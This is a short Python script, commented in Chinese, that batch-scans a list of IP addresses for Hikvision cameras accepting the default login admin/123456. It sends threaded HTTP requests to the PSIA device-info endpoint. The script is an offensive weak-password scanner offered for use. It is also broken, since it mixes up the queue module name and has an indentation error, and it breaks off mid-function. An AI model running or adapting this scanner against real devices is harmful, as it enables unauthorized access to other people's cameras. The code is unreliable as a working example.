#!/usr/bin/env python
#-*-coding:utf-8-*-
#批量筛选海康威视摄像头的弱密码
import threading
import requests
import queue
import sys
import re

def Threads():
    threadlist=[]
    queue=Queue.Queue()
    for ip in open('ip.txt','r'): #扫描出的ip
        queue.put(ip.replace('\n',''))
    for x in range(0,10):  #线程数
        th=threading.Thread(target=scan_Hikvision,args=(queue,))
        threadlist.append(th)
    for t in threadlist:
        t.start()
    for t in threadlist:
        t.join()

def scan_Hikvision(queue):
    while not queue.empty():
        ip=queue.get()
            try:
                print("[*]scan:"+ip)
                r = requests.get(url=("http://%s/PSIA/System/deviceinfo" % ip),auth=('admin','123456'))